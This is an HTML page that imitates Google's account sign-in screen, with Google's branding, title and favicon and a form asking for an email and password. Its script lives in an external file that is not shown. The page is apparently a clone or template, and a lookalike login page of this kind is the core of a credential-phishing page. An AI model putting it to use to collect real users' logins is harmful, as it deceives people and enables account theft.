<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
            <div class="sign-in-container">
                <h1 class="sign-in">Sign in</h1>
                <p>with your Google Account</p>
            </div>
        </header>
        <form class="form">
            <input type="email" placeholder="Email or phone" required>
            <input type="password" placeholder="Email your password" required>
            <div class="submit-container">
                <a href="#" class="link">Forget password?</a>
                <button class="submit-btn" type="submit">Next</button>
            </div>
        </form>
    </div>
    <script src="index.js"></script>
</body>
</html>
